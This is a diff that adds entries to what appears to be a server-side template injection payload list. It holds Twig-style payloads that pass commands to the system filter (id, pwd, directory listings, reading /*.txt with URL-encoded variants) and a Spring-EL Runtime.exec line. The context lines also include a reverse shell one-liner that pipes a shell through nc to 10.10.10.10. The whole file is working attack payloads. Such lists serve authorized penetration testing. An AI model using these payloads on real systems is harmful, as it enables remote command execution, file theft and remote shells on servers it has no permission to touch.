@@ -110,3 +110,16 @@ ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().ex
 {{{{[\'cat%2B%2F%2A.tx']|filter('system')}}}}
 {{{{[\'whoami']|filter('system')}}}}
 {{{{[\'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 7979 >/tmp/f']|filter('system')}}}}
+{{{{['pwd']|map("system")|join}}}}
+{{{{['id']|map("system")|join}}}}
+{{{{['ls']|map("system")|join}}}}
+{{{{['ls+/']|map("system")|join}}}}
+{{{{['ls%2B/']|map("system")|join}}}}
+{{{{['ls%2B../']|map("system")|join}}}}
+{{{{['ls%2B..%2F']|map("system")|join}}}}
+{{{{['ls%2B../../']|map("system")|join}}}}
+{{{{['ls%2B..%2F..%2F']|map("system")|join}}}}
+{{{{['cat+/*.txt']|map("system")|join}}}}
+{{{{['cat%2b/*.txt']|map("system")|join}}}}
+{{{{['cat%2b%2F*.txt']|map("system")|join}}}}
+{{{{['cat%2b%2F%2A.txt']|map("system")|join}}}}
